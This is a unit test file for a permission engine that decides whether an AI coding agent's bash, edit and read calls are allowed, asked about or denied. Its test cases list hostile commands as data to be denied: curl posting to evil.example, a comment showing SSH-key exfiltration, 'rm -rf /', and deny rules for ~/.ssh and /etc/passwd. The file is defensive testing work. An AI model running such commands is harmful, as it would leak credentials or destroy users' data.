/**
 * @vitest-environment node
 *
 * Unit tests for PiPermissionEngine (permission-engine.ts) — pure decision
 * logic, no fs/network. mergedClaudeRulesFor's tests mock claude-settings so
 * they're hermetic (no dependence on the dev machine's real ~/.claude).
 */
import { describe, it, expect, vi, beforeEach } from 'vitest'
import path from 'node:path'
import { homedir } from 'node:os'
import type { MergedClaudeRules } from '../permission-engine'

const { mockLoadClaudePermissions } = vi.hoisted(() => ({
  mockLoadClaudePermissions: vi.fn()
}))
vi.mock('../../services/claude-settings', () => ({
  loadClaudePermissions: mockLoadClaudePermissions
}))
vi.mock('../../services/logger', () => ({
  logger: { debug: vi.fn(), info: vi.fn(), warn: vi.fn(), error: vi.fn() }
}))

import {
  decide,
  decideWithSource,
  piToolKind,
  sessionAllowKey,
  normalizeWhitespace,
  mergedClaudeRulesFor,
  withoutAllowRules,
  claudeGlobMatches,
  PI_AUTO_ALLOW_HOSTED_TOOLS,
  PI_HOSTED_TOOL_NAMES,
  EMPTY_RULES,
  isPlanSafeBashCommand,
  isPlanReadOnlyCommand,
  planModeOutranksRules,
  PLAN_MODE_DENY_REASON,
  PLAN_MODE_DENY_REASON_NO_EXIT_TOOL,
  PLAN_EXIT_OUTSIDE_PLAN_REASON
} from '../permission-engine'
import { piMcpRuleKey } from '../pi-mcp-bridge'

function rules(partial: Partial<MergedClaudeRules> = {}): MergedClaudeRules {
  return {
    allow: [],
    deny: [],
    ask: [],
    additionalDirectories: [],
    defaultMode: undefined,
    ...partial
  }
}

const NO_SESSION_ALLOWS = new Set<string>()

beforeEach(() => {
  mockLoadClaudePermissions.mockReset()
})

describe('piToolKind', () => {
  it('maps pi built-in tool names', () => {
    expect(piToolKind('bash')).toBe('command')
    expect(piToolKind('edit')).toBe('fileEdit')
    expect(piToolKind('write')).toBe('fileWrite')
    expect(piToolKind('read')).toBe('fileRead')
    expect(piToolKind('grep')).toBe('search')
    expect(piToolKind('find')).toBe('search')
    expect(piToolKind('ls')).toBe('search')
    expect(piToolKind('mystery')).toBe('unknown')
  })

  it('resolves hosted-MCP tool names engine-independently (M4 readiness)', () => {
    expect(piToolKind('mcp__claude-ui__render_mermaid')).toBe('diagram')
    expect(piToolKind('mcp__some-server__tool')).toBe('mcp')
  })

  it('maps hosted-tool BARE names registered via pi.registerTool (M4a+b)', () => {
    expect(piToolKind('render_mermaid')).toBe('diagram')
    expect(piToolKind('create_mockup')).toBe('mockup')
    expect(piToolKind('show_mockup')).toBe('mockup')
    expect(piToolKind('dispatch_agent')).toBe('task')
  })

  it('maps exit_plan (bridge extension, M5a) to the "plan" kind', () => {
    expect(piToolKind('exit_plan')).toBe('plan')
  })

  it('maps the agent tool (bridge v9, ADR-089) to the "task" kind', () => {
    expect(piToolKind('agent')).toBe('task')
  })

  it('maps subagent (legacy M5b transcripts, pi upstream example) to the SAME "task" kind as dispatch_agent', () => {
    expect(piToolKind('subagent')).toBe('task')
    expect(piToolKind('subagent')).toBe(piToolKind('dispatch_agent'))
  })
})

describe('decide — mode base (no rules, no sessionAllows)', () => {
  const ctx = (mode: string) => ({ mode, rules: rules(), sessionAllows: NO_SESSION_ALLOWS })

  const cases: [string, string, 'allow' | 'ask' | 'deny'][] = [
    // default: fileRead/search allow, everything else ask
    ['default', 'read', 'allow'],
    ['default', 'grep', 'allow'],
    ['default', 'find', 'allow'],
    ['default', 'ls', 'allow'],
    ['default', 'edit', 'ask'],
    ['default', 'write', 'ask'],
    ['default', 'bash', 'ask'],
    ['default', 'unknown_tool', 'ask'],
    // acceptEdits: also fileEdit/fileWrite allow, bash/unknown ask
    ['acceptEdits', 'read', 'allow'],
    ['acceptEdits', 'grep', 'allow'],
    ['acceptEdits', 'edit', 'allow'],
    ['acceptEdits', 'write', 'allow'],
    ['acceptEdits', 'bash', 'ask'],
    ['acceptEdits', 'unknown_tool', 'ask'],
    // full / auto / bypassPermissions: allow everything
    ['full', 'bash', 'allow'],
    ['full', 'edit', 'allow'],
    ['full', 'unknown_tool', 'allow'],
    ['auto', 'bash', 'allow'],
    ['auto', 'unknown_tool', 'allow'],
    ['bypassPermissions', 'bash', 'allow'],
    ['bypassPermissions', 'unknown_tool', 'allow'],
    // plan (M5a — real autonomy mode, see the dedicated "decide — plan mode
    // base (M5a)" describe block below for the fuller matrix): reads still
    // allow; edit denies outright (no interactive ask tier); an empty-input
    // bash call matches no SAFE_PATTERN, so it denies too ("when unsure, deny").
    ['plan', 'read', 'allow'],
    ['plan', 'edit', 'deny'],
    ['plan', 'bash', 'deny'],
    // an unrecognised mode string falls back to default's behavior (fail toward asking)
    ['some-future-mode', 'read', 'allow'],
    ['some-future-mode', 'bash', 'ask']
  ]

  it.each(cases)('mode=%s toolName=%s -> %s', (mode, toolName, expected) => {
    expect(decide(toolName, {}, ctx(mode))).toBe(expected)
  })
})

describe('decide — plan mode base (M5a)', () => {
  const ctx = (rulesOverride: Partial<MergedClaudeRules> = {}) => ({
    mode: 'plan',
    rules: rules(rulesOverride),
    sessionAllows: NO_SESSION_ALLOWS
  })

  it('reads and search always allow', () => {
    expect(decide('read', { path: 'a.ts' }, ctx())).toBe('allow')
    expect(decide('grep', { pattern: 'TODO' }, ctx())).toBe('allow')
    expect(decide('find', { pattern: '*.ts' }, ctx())).toBe('allow')
    expect(decide('ls', {}, ctx())).toBe('allow')
  })

  it('edit and write deny outright (no ask tier of their own in plan mode)', () => {
    expect(decide('edit', { path: 'a.ts' }, ctx())).toBe('deny')
    expect(decide('write', { path: 'a.ts' }, ctx())).toBe('deny')
  })

  it('a safe bash command allows; an unsafe one denies', () => {
    expect(decide('bash', { command: 'ls -la' }, ctx())).toBe('allow')
    expect(decide('bash', { command: 'rm -rf /tmp/x' }, ctx())).toBe('deny')
  })

  it('exit_plan (the "plan" kind) always asks — that surfaces ExitPlanModeCard', () => {
    expect(decide('exit_plan', { plan: '1. Do X' }, ctx())).toBe('ask')
  })

  it('an unmapped/unrecognized tool kind denies (fail toward deny, not allow)', () => {
    expect(decide('dispatch_agent', { engine: 'claude', prompt: 'x' }, ctx())).toBe('deny')
    expect(decide('mystery_tool', {}, ctx())).toBe('deny')
  })

  it('subagent (the "task" kind, M5b) ALSO denies in plan mode — same fallback as dispatch_agent, no special case', () => {
    expect(decide('subagent', { agent: 'echoer', task: 'x' }, ctx())).toBe('deny')
  })

  it('the hosted three still auto-allow in plan mode — they do not mutate the repo', () => {
    for (const name of ['render_mermaid', 'create_mockup', 'show_mockup']) {
      expect(decide(name, {}, ctx())).toBe('allow')
    }
  })

  it('an explicit user deny rule still beats the plan-mode base (precedence unchanged)', () => {
    // Mode base for 'read' is allow, but an explicit deny rule wins.
    expect(decide('read', { path: 'secret.env' }, ctx({ deny: ['Read'] }))).toBe('deny')
  })

  it('an explicit user ask rule no longer beats the plan-mode base deny for an edit (ADR-085 ruling 7)', () => {
    // Plan mode wins for a mutating call: the ask rule does not surface a card,
    // the edit is refused (opencode refuses it host-side before any ask rule too).
    expect(decide('edit', { path: 'a.ts' }, ctx({ ask: ['Edit'] }))).toBe('deny')
  })

  it('an explicit user allow rule no longer beats the plan-mode base deny for bash (ADR-085 ruling 7)', () => {
    expect(
      decide('bash', { command: 'rm -rf /tmp/x' }, ctx({ allow: ['Bash(rm -rf /tmp/x)'] }))
    ).toBe('deny')
  })
})

describe('PLAN_MODE_DENY_REASON', () => {
  it('is the exact model-actionable reason string', () => {
    expect(PLAN_MODE_DENY_REASON).toBe(
      'Plan mode is read-only — present a plan and call exit_plan to proceed'
    )
  })
})

describe('PLAN_MODE_DENY_REASON_NO_EXIT_TOOL (ADR-085 S4, S3b verifier F4)', () => {
  it('is the exact reason string for the engines without an exit_plan tool (opencode, Codex)', () => {
    expect(PLAN_MODE_DENY_REASON_NO_EXIT_TOOL).toBe(
      'Plan mode is read-only — present the plan and ask the user to leave plan mode to proceed'
    )
  })

  it('never points the model at exit_plan, a tool only pi has', () => {
    expect(PLAN_MODE_DENY_REASON_NO_EXIT_TOOL).not.toContain('exit_plan')
  })
})

describe('decide — exit_plan OUTSIDE plan mode denies in every mode (M5a addendum)', () => {
  // pi.registerTool() auto-activates the tool, so exit_plan is model-visible
  // from spawn in EVERY mode until the extension's session_start hook hides
  // it — the gate is the backstop: kind 'plan' outside mode 'plan' denies,
  // even in full's otherwise allow-everything base (a mode-transition tool
  // must not be model-invocable when there is no mode to exit; mirrors
  // cli.js never offering ExitPlanMode outside plan mode).
  const ctx = (mode: string) => ({ mode, rules: rules(), sessionAllows: NO_SESSION_ALLOWS })

  it.each(['default', 'acceptEdits', 'full', 'auto', 'bypassPermissions', 'some-future-mode'])(
    'exit_plan denies in mode=%s',
    (mode) => {
      expect(decide('exit_plan', { plan: '1. Do X' }, ctx(mode))).toBe('deny')
    }
  )

  it("exit_plan still asks in mode='plan' (the ExitPlanModeCard approval)", () => {
    expect(decide('exit_plan', { plan: '1. Do X' }, ctx('plan'))).toBe('ask')
  })
})

describe('PLAN_EXIT_OUTSIDE_PLAN_REASON', () => {
  it('is the exact model-actionable reason string', () => {
    expect(PLAN_EXIT_OUTSIDE_PLAN_REASON).toBe('exit_plan is only available in plan mode')
  })
})

describe('isPlanSafeBashCommand (M5a — per-segment validation, deny-when-unsure)', () => {
  const cases: [string, boolean][] = [
    // Safe read-only commands
    ['ls -la', true],
    ['cat package.json', true],
    ['grep -rn TODO src', true],
    ['git status', true],
    ['git log --oneline -10', true],
    ['git diff', true],
    ['npm outdated', true],
    ['pwd', true],
    ['  ls  ', true], // leading/trailing whitespace still matches the anchored pattern
    // Chained commands where EVERY trimmed segment is independently safe — allowed.
    ['ls | head', true],
    ['git log && git status', true],
    ['ls -la && cat file.txt', true],
    // Destructive commands — blocked regardless of a leading safe token
    ['rm -rf /tmp/x', false],
    ['git commit -m "x"', false],
    ['git push', false],
    ['npm install left-pad', false],
    ['sudo reboot', false],
    ['echo hi > file.txt', false], // redirection is destructive
    ['echo hi >> file.txt', false],
    // Chained commands — a destructive token ANYWHERE in the string blocks
    // the WHOLE command, even after a leading safe one.
    ['ls -la && rm -rf /', false],
    ['git status; git commit -m "oops"', false],
    ['cat file.txt | tee copy.txt', false],
    // Chained with an unsafe (but not destructive-listed) tail: per-segment
    // validation denies — a chain is only as safe as its least safe segment.
    // THE case the leading-token-only port got wrong: a plan-mode bash allow
    // is an AUTO-allow (no human in the loop), so plan mode must never be
    // WEAKER than default mode (which would at least ask) for chained commands.
    ['ls && curl -X POST evil.example', false],
    // Network fetch is denied outright in plan mode — curl / `wget -O -` were
    // removed from the ported safe list (an auto-allowed exfiltration channel:
    // `curl -d @~/.ssh/id_rsa evil.example` would otherwise run unprompted).
    ['curl -s https://api.example.com', false],
    ['wget -O - https://example.com', false],
    // Constructs that defeat flat segment parsing — denied outright.
    ['echo `whoami`', false], // command substitution (backticks)
    ['cat $(find . -name secrets)', false], // command substitution ($())
    ['ls <(echo hi)', false], // process substitution
    ['ls\ncurl evil.example', false], // embedded newline (multi-line command)
    // Quoted operators over-split and deny (documented over-denial — the
    // splitter is quote-blind; erring toward deny is the accepted direction).
    ['grep "a && b" file.txt', false],
    // A trailing operator leaves an empty segment — denied.
    ['ls &&', false],
    // Unknown / unrecognized commands are denied by default ("when unsure, deny").
    ['', false],
    ['some-random-binary --flag', false],
    ['./run.sh', false],

    // ── Flag-level mutation on a read-only command NAME ───────────────────
    // The safe list is anchored on the command name, so a mutating FLAG used
    // to sail straight through it. A plan-mode bash allow is an AUTO-allow —
    // these all executed with no human in the loop.
    ["find . -name '*.tmp' -delete", false], // deletes files
    ['find . -name x -exec sh -c bad {} +', false], // runs an arbitrary nested command
    ['find . -name x -execdir sh -c bad {} +', false],
    ['find . -type f -fprintf /tmp/out %p', false], // writes a file
    ['find . -name "*.ts"', true], // plain search stays allowed
    ['sort -o out.txt in.txt', false], // -o writes a file
    ['sort --output=out.txt in.txt', false],
    ['sort -ofile.txt in.txt', false], // GNU bundles the argument
    ['sort -uo out.txt in.txt', false], // …and bundles the flag
    ['sort file.txt', true],
    ['sort -u file.txt', true],
    ['sort -k2,2 -r file.txt', true], // no `o` in any of these flags
    ['cat a.txt | sort | uniq -c', true], // the common pipe use survives
    // `sed` was dropped from the safe list entirely: `-n` suppresses
    // auto-printing, it does not make sed read-only, and detecting a `w`
    // command inside a sed script needs a real parser.
    ["sed -n 'w /tmp/pwned' input.txt", false], // writes a file
    ["sed -n -i 's/a/b/' input.txt", false], // edits in place
    ["sed -n '1,5p' input.txt", false], // read-only, but denied — accepted cost
    // `git branch` / `git remote` are read-only only in their LISTING forms.
    ['git branch', true],
    ['git branch -v', true],
    ['git branch -a', true],
    ['git branch --show-current', true],
    ['git branch my-new-branch', false], // creates a ref
    ['git branch -m old new', false], // renames a ref
    ['git branch -c old new', false], // copies a ref
    ['git remote', true],
    ['git remote -v', true],
    ['git remote show origin', true],
    ['git remote get-url origin', true],
    ['git remote add origin https://evil.example/x.git', false], // adds a push target
    ['git remote set-url origin https://evil.example/x.git', false],
    ['git remote rename origin upstream', false]
  ]

  it.each(cases)('isPlanSafeBashCommand(%j) === %s', (command, expected) => {
    expect(isPlanSafeBashCommand(command)).toBe(expected)
  })
})

describe('decide — PI_AUTO_ALLOW_HOSTED_TOOLS (M4a)', () => {
  it('contains exactly the three hosted LLM tools plus the read-only list_models, not dispatch_agent', () => {
    expect([...PI_AUTO_ALLOW_HOSTED_TOOLS].sort()).toEqual([
      'create_mockup',
      'list_models',
      'render_mermaid',
      'show_mockup'
    ])
  })

  it.each(['render_mermaid', 'create_mockup', 'show_mockup'])(
    '%s is ALWAYS allowed in default mode (would otherwise ask — unmapped/unknown kind)',
    (toolName) => {
      const ctx = { mode: 'default', rules: rules(), sessionAllows: NO_SESSION_ALLOWS }
      expect(decide(toolName, {}, ctx)).toBe('allow')
    }
  )

  it.each(['render_mermaid', 'create_mockup', 'show_mockup'])(
    '%s is allowed even with an unrelated ask rule present',
    (toolName) => {
      const ctx = {
        mode: 'default',
        rules: rules({ ask: ['Bash'] }),
        sessionAllows: NO_SESSION_ALLOWS
      }
      expect(decide(toolName, {}, ctx)).toBe('allow')
    }
  )

  it('list_models (ADR-089 S3) is a note-kind, read-only hosted tool: auto-allowed in every mode, plan included, with no card', () => {
    expect(piToolKind('list_models')).toBe('note')
    for (const mode of ['default', 'acceptEdits', 'plan', 'full']) {
      const ctx = { mode, rules: rules({ ask: ['Bash'] }), sessionAllows: NO_SESSION_ALLOWS }
      expect(decide('list_models', { query: 'x' }, ctx), mode).toBe('allow')
    }
    // Unlike dispatch_agent / agent it needs no mode-base decision.
    expect(PI_AUTO_ALLOW_HOSTED_TOOLS.has('list_models')).toBe(true)
  })

  it('dispatch_agent is NOT auto-allowed — normal mode-base gating (ask in default)', () => {
    const ctx = { mode: 'default', rules: rules(), sessionAllows: NO_SESSION_ALLOWS }
    expect(decide('dispatch_agent', {}, ctx)).toBe('ask')
  })

  it('dispatch_agent is NOT auto-allowed — normal mode-base gating (ask in acceptEdits too, unknown kind)', () => {
    const ctx = { mode: 'acceptEdits', rules: rules(), sessionAllows: NO_SESSION_ALLOWS }
    expect(decide('dispatch_agent', {}, ctx)).toBe('ask')
  })

  it('dispatch_agent is NOT auto-allowed — normal mode-base gating (allow in full)', () => {
    const ctx = { mode: 'full', rules: rules(), sessionAllows: NO_SESSION_ALLOWS }
    expect(decide('dispatch_agent', {}, ctx)).toBe('allow')
  })

  it('subagent (M5b) is NOT auto-allowed either — same normal "task" kind mode-base gating: ask in default, allow in full, deny in plan', () => {
    expect(
      decide('subagent', {}, { mode: 'default', rules: rules(), sessionAllows: NO_SESSION_ALLOWS })
    ).toBe('ask')
    expect(
      decide('subagent', {}, { mode: 'full', rules: rules(), sessionAllows: NO_SESSION_ALLOWS })
    ).toBe('allow')
    expect(
      decide('subagent', {}, { mode: 'plan', rules: rules(), sessionAllows: NO_SESSION_ALLOWS })
    ).toBe('deny')
  })

  it('checks deny rules BEFORE the hosted-tool auto-allow short-circuit (source-order guard)', () => {
    // No CLAUDE_TOOL_TO_KIND entry maps to diagram/mockup/task today, so a
    // REAL conflicting deny rule can't be constructed through the public
    // rules() shape to exercise "deny still wins" behaviorally — assert the
    // source ordering directly instead (mirrors pi-bridge-source.test.ts's
    // skillEnvIdx/earlyReturnIdx technique for the identical "can't observe
    // through the public API yet" situation).
    // The ladder itself lives in decideWithSource now (decide() is its
    // provenance-free projection) — read the source that actually orders it.
    const src = decideWithSource.toString()
    const denyIdx = src.indexOf('ctx.rules.deny')
    const autoAllowIdx = src.indexOf('PI_AUTO_ALLOW_HOSTED_TOOLS')
    expect(denyIdx).toBeGreaterThan(-1)
    expect(autoAllowIdx).toBeGreaterThan(-1)
    expect(denyIdx).toBeLessThan(autoAllowIdx)
  })
})

describe('decide — deny > ask > allow precedence', () => {
  it('a matching deny rule wins even when the SAME tool also matches ask and allow rules', () => {
    const ctx = {
      mode: 'default',
      rules: rules({ deny: ['Edit'], ask: ['Edit'], allow: ['Edit'] }),
      sessionAllows: NO_SESSION_ALLOWS
    }
    expect(decide('edit', {}, ctx)).toBe('deny')
  })

  it('without the deny rule, a matching ask rule wins over allow', () => {
    const ctx = {
      mode: 'default',
      rules: rules({ ask: ['Edit'], allow: ['Edit'] }),
      sessionAllows: NO_SESSION_ALLOWS
    }
    expect(decide('edit', {}, ctx)).toBe('ask')
  })

  it('without deny/ask, a matching allow rule wins over the mode base', () => {
    const ctx = {
      mode: 'default', // mode base for 'edit' would be 'ask'
      rules: rules({ allow: ['Edit'] }),
      sessionAllows: NO_SESSION_ALLOWS
    }
    expect(decide('edit', {}, ctx)).toBe('allow')
  })

  it('full mode still honors an explicit ask rule (autonomy is not a bypass of a user rule)', () => {
    const ctx = { mode: 'full', rules: rules({ ask: ['Bash'] }), sessionAllows: NO_SESSION_ALLOWS }
    expect(decide('bash', { command: 'anything' }, ctx)).toBe('ask')
  })

  it('full mode still honors an explicit deny rule', () => {
    const ctx = { mode: 'full', rules: rules({ deny: ['Bash'] }), sessionAllows: NO_SESSION_ALLOWS }
    expect(decide('bash', { command: 'anything' }, ctx)).toBe('deny')
  })
})

describe('decide — Bash prefix/exact rules', () => {
  it('a prefix rule (cmd:*) matches a command starting with that prefix', () => {
    const ctx = {
      mode: 'default',
      rules: rules({ allow: ['Bash(npm test:*)'] }),
      sessionAllows: NO_SESSION_ALLOWS
    }
    expect(decide('bash', { command: 'npm test unit' }, ctx)).toBe('allow')
  })

  it('a prefix rule does not match an unrelated command', () => {
    const ctx = {
      mode: 'default',
      rules: rules({ allow: ['Bash(npm test:*)'] }),
      sessionAllows: NO_SESSION_ALLOWS
    }
    expect(decide('bash', { command: 'npm build' }, ctx)).toBe('ask')
  })

  it('an exact rule (no :*) matches only the identical command', () => {
    const ctx = {
      mode: 'default',
      rules: rules({ allow: ['Bash(echo hi)'] }),
      sessionAllows: NO_SESSION_ALLOWS
    }
    expect(decide('bash', { command: 'echo hi' }, ctx)).toBe('allow')
    expect(decide('bash', { command: 'echo hi there' }, ctx)).toBe('ask')
  })

  it('whitespace-normalizes both the rule and the command before comparing (prefix form)', () => {
    const ctx = {
      mode: 'default',
      rules: rules({ allow: ['Bash(npm  test:*)'] }),
      sessionAllows: NO_SESSION_ALLOWS
    }
    expect(decide('bash', { command: '  npm test   unit  ' }, ctx)).toBe('allow')
  })

  it('whitespace-normalizes both the rule and the command before comparing (exact form)', () => {
    const ctx = {
      mode: 'default',
      rules: rules({ allow: ['Bash(echo   hi)'] }),
      sessionAllows: NO_SESSION_ALLOWS
    }
    expect(decide('bash', { command: '  echo hi  ' }, ctx)).toBe('allow')
  })

  it('a bare Bash rule (no specifier) matches every command', () => {
    const ctx = {
      mode: 'default',
      rules: rules({ allow: ['Bash'] }),
      sessionAllows: NO_SESSION_ALLOWS
    }
    expect(decide('bash', { command: 'anything at all' }, ctx)).toBe('allow')
  })
})

describe('decide — path-glob specifier rules (Edit/Write/Read/Grep/Glob/LS) are now evaluated', () => {
  it('a scoped Edit(src/**) allow rule matches a path under src/ (no cwd — raw-path fallback)', () => {
    const ctx = {
      mode: 'default', // mode base for edit is 'ask'
      rules: rules({ allow: ['Edit(src/**)'] }),
      sessionAllows: NO_SESSION_ALLOWS
    }
    expect(decide('edit', { path: 'src/foo.ts' }, ctx)).toBe('allow')
  })

  it('the SAME rule does NOT match a path outside its scope — falls through to the mode base', () => {
    const ctx = {
      mode: 'default',
      rules: rules({ allow: ['Edit(src/**)'] }),
      sessionAllows: NO_SESSION_ALLOWS
    }
    expect(decide('edit', { path: 'lib/foo.ts' }, ctx)).toBe('ask')
  })

  it('an ask-tier specifier rule that DOES match now forces ask, overriding a would-be mode-base allow', () => {
    const ctx = {
      mode: 'acceptEdits', // mode base for fileEdit is 'allow'
      rules: rules({ ask: ['Edit(src/**)'] }),
      sessionAllows: NO_SESSION_ALLOWS
    }
    expect(decide('edit', { path: 'src/foo.ts' }, ctx)).toBe('ask')
  })

  it('a bare Edit rule (no specifier) still matches unconditionally alongside a non-matching specifier rule', () => {
    const ctx = {
      mode: 'default',
      rules: rules({ allow: ['Edit(src/**)', 'Edit'] }),
      sessionAllows: NO_SESSION_ALLOWS
    }
    expect(decide('edit', { path: 'anywhere.ts' }, ctx)).toBe('allow')
  })

  it('Read(**) (a broad glob) is honored for read', () => {
    const ctx = {
      mode: 'default',
      rules: rules({ deny: ['Read(**)'] }),
      sessionAllows: NO_SESSION_ALLOWS
    }
    expect(decide('read', { path: 'anything/at/all.ts' }, ctx)).toBe('deny')
  })

  it('a scoped Read(docs/**) matches only under docs/', () => {
    const ctx = {
      mode: 'default',
      rules: rules({ deny: ['Read(docs/**)'] }),
      sessionAllows: NO_SESSION_ALLOWS
    }
    expect(decide('read', { path: 'docs/readme.md' }, ctx)).toBe('deny')
    // Mode base for read is 'allow' — the deny rule not matching falls through to it.
    expect(decide('read', { path: 'src/foo.ts' }, ctx)).toBe('allow')
  })

  it('deny precedence: a scoped Deny Edit(src/secret/**) wins even in full (allow-everything) mode', () => {
    const ctx = {
      mode: 'full',
      rules: rules({ deny: ['Edit(src/secret/**)'] }),
      sessionAllows: NO_SESSION_ALLOWS
    }
    expect(decide('edit', { path: 'src/secret/keys.ts' }, ctx)).toBe('deny')
    // A different path under the same mode falls through to full mode's allow-everything base.
    expect(decide('edit', { path: 'src/other.ts' }, ctx)).toBe('allow')
  })

  it('a path-bearing rule never default-allows when the input has no usable path', () => {
    const ctx = {
      mode: 'default',
      rules: rules({ allow: ['Edit(src/**)'] }),
      sessionAllows: NO_SESSION_ALLOWS
    }
    // No `path`/`file_path` on the input at all — falls through to mode base ('ask' for edit).
    expect(decide('edit', {}, ctx)).toBe('ask')
  })

  it('search kind (grep/find/ls) path-scoping: a rule matches the search-root `path` field', () => {
    const ctx = {
      mode: 'default',
      rules: rules({ deny: ['Grep(secrets/**)'] }),
      sessionAllows: NO_SESSION_ALLOWS
    }
    expect(decide('grep', { pattern: 'TODO', path: 'secrets/vault' }, ctx)).toBe('deny')
    expect(decide('grep', { pattern: 'TODO', path: 'src' }, ctx)).toBe('allow') // mode base for search is allow
  })

  it('a Grep(TODO)-style search-TERM specifier is attempted as a path glob and (correctly) never matches a real path — falls through, never default-allows', () => {
    const ctx = {
      mode: 'default',
      rules: rules({ deny: ['Grep(TODO)'] }),
      sessionAllows: NO_SESSION_ALLOWS
    }
    expect(decide('grep', { pattern: 'TODO', path: 'src' }, ctx)).toBe('allow') // mode base for search — deny rule didn't match
  })

  it('cwd-relative matching: an ABSOLUTE path inside cwd relativizes and matches a relative glob', () => {
    const ctx = {
      mode: 'default',
      rules: rules({ allow: ['Edit(src/**)'] }),
      sessionAllows: NO_SESSION_ALLOWS,
      cwd: '/repo'
    }
    expect(decide('edit', { path: '/repo/src/foo.ts' }, ctx)).toBe('allow')
  })

  it('cwd-relative matching: an ABSOLUTE path OUTSIDE cwd relativizes to ../… and does NOT match', () => {
    const ctx = {
      mode: 'default',
      rules: rules({ allow: ['Edit(src/**)'] }),
      sessionAllows: NO_SESSION_ALLOWS,
      cwd: '/repo'
    }
    expect(decide('edit', { path: '/elsewhere/src/foo.ts' }, ctx)).toBe('ask') // falls through to mode base
  })

  it('cwd-relative matching: a relative input path is resolved against cwd first, then relativized (round-trips to itself)', () => {
    const ctx = {
      mode: 'default',
      rules: rules({ allow: ['Edit(src/**)'] }),
      sessionAllows: NO_SESSION_ALLOWS,
      cwd: '/repo'
    }
    expect(decide('edit', { path: 'src/foo.ts' }, ctx)).toBe('allow')
  })

  it('Windows-style backslash-separated input matches a forward-slash rule glob (both normalized before comparing)', () => {
    const ctx = {
      mode: 'default',
      rules: rules({ allow: ['Edit(src/**)'] }),
      sessionAllows: NO_SESSION_ALLOWS,
      cwd: 'D:\\repo'
    }
    expect(decide('edit', { path: 'D:\\repo\\src\\foo.ts' }, ctx)).toBe('allow')
  })

  it('Windows-style RELATIVE input under a Windows cwd is resolved then relativized (round-trips to itself)', () => {
    const ctx = {
      mode: 'default',
      rules: rules({ allow: ['Edit(src/**)'] }),
      sessionAllows: NO_SESSION_ALLOWS,
      cwd: 'D:\\repo'
    }
    expect(decide('edit', { path: 'src\\foo.ts' }, ctx)).toBe('allow')
  })

  it('cross-drive absolute path stays OUTSIDE a Windows cwd and does NOT match a relative glob', () => {
    const ctx = {
      mode: 'default',
      rules: rules({ allow: ['Edit(src/**)'] }),
      sessionAllows: NO_SESSION_ALLOWS,
      cwd: 'D:\\repo'
    }
    expect(decide('edit', { path: 'E:\\other\\src\\foo.ts' }, ctx)).toBe('ask') // falls through to mode base
  })

  it('a Windows path OUTSIDE cwd (../-style) does NOT match a relative glob', () => {
    const ctx = {
      mode: 'default',
      rules: rules({ allow: ['Edit(src/**)'] }),
      sessionAllows: NO_SESSION_ALLOWS,
      cwd: 'D:\\repo\\src'
    }
    expect(decide('edit', { path: 'D:\\repo\\other\\foo.ts' }, ctx)).toBe('ask') // falls through to mode base
  })

  it('no-cwd fallback: matches the RAW input path as-is (documented best-effort) when the caller omits cwd', () => {
    const ctx = {
      mode: 'default',
      rules: rules({ allow: ['Edit(src/**)'] }),
      sessionAllows: NO_SESSION_ALLOWS
    }
    // No cwd -> raw path used directly; an absolute path is compared literally
    // and does NOT match a relative-style glob (documents the limitation).
    expect(decide('edit', { path: '/repo/src/foo.ts' }, ctx)).toBe('ask')
    // But a raw path that's ALREADY in the glob's own relative form still matches.
    expect(decide('edit', { path: 'src/foo.ts' }, ctx)).toBe('allow')
  })

  it('legacy file_path alias is honored for edit/write/read when path is absent', () => {
    const ctx = {
      mode: 'default',
      rules: rules({ deny: ['Edit(src/**)'] }),
      sessionAllows: NO_SESSION_ALLOWS
    }
    expect(decide('edit', { file_path: 'src/foo.ts' }, ctx)).toBe('deny')
  })
})

describe('decide — ABSOLUTE / home-dir / Windows-absolute rule specifiers', () => {
  // resolveMatchPath always relativises the TOOL path against cwd, but rule
  // specifiers were matched verbatim — so every absolute-looking specifier
  // compared an absolute glob against a relative string and could NEVER match.
  // `Edit(~/.ssh/**)`, `Read(//etc/shadow)` and `Edit(D:\secrets\**)` were
  // inert: the tool ran with no prompt at all, in every mode.
  const HOME = homedir()

  const ctx = (partial: Partial<MergedClaudeRules>, cwd?: string) => ({
    mode: 'default',
    rules: rules(partial),
    sessionAllows: NO_SESSION_ALLOWS,
    ...(cwd === undefined ? {} : { cwd })
  })

  it('`//abs/path` (Claude double-slash = absolute) matches the absolute tool path', () => {
    expect(
      decide('read', { path: '/etc/passwd' }, ctx({ deny: ['Read(//etc/passwd)'] }, '/repo'))
    ).toBe('deny')
    expect(
      decide(
        'edit',
        { path: '/srv/secrets/k.pem' },
        ctx({ deny: ['Edit(//srv/secrets/**)'] }, '/repo')
      )
    ).toBe('deny')
  })

  it('`~/…` expands to the home directory', () => {
    const cwd = path.join(HOME, 'proj')
    expect(
      decide(
        'read',
        { path: path.join(HOME, '.ssh', 'id_rsa') },
        ctx({ deny: ['Read(~/.ssh/**)'] }, cwd)
      )
    ).toBe('deny')
    // …and a bare `~` covers the whole home tree.
    expect(
      decide('read', { path: path.join(HOME, 'notes.md') }, ctx({ deny: ['Read(~)'] }, cwd))
    ).toBe('allow')
    expect(
      decide('read', { path: path.join(HOME, 'notes.md') }, ctx({ deny: ['Read(~/**)'] }, cwd))
    ).toBe('deny')
  })

  it('a Windows-absolute specifier matches regardless of separator or drive-letter case', () => {
    for (const rule of ['Edit(D:\\secrets\\**)', 'Edit(D:/secrets/**)', 'Edit(d:/secrets/**)']) {
      expect(
        decide('edit', { path: 'D:\\secrets\\keys.txt' }, ctx({ deny: [rule] }, 'D:\\repo')),
        rule
      ).toBe('deny')
      expect(
        decide('edit', { path: 'd:/secrets/keys.txt' }, ctx({ deny: [rule] }, 'D:\\repo')),
        rule
      ).toBe('deny')
    }
  })

  it('a relative tool path is resolved against cwd before the absolute comparison', () => {
    // `src/a.ts` under cwd D:\secrets IS inside the denied tree.
    expect(
      decide('edit', { path: 'src\\a.ts' }, ctx({ deny: ['Edit(D:\\secrets\\**)'] }, 'D:\\secrets'))
    ).toBe('deny')
  })

  it('an absolute specifier does NOT match a path outside it (no over-broadening)', () => {
    expect(
      decide('read', { path: '/etc/hosts' }, ctx({ deny: ['Read(//etc/passwd)'] }, '/repo'))
    ).toBe('allow')
    expect(
      decide(
        'edit',
        { path: 'D:\\repo\\src\\a.ts' },
        ctx({ deny: ['Edit(D:\\secrets\\**)'] }, 'D:\\repo')
      )
    ).toBe('ask')
  })

  it('a `..`-containing tool path is normalised before comparing (no traversal escape)', () => {
    expect(
      decide(
        'read',
        { path: '/repo/../etc/passwd' },
        ctx({ deny: ['Read(//etc/passwd)'] }, '/repo')
      )
    ).toBe('deny')
  })

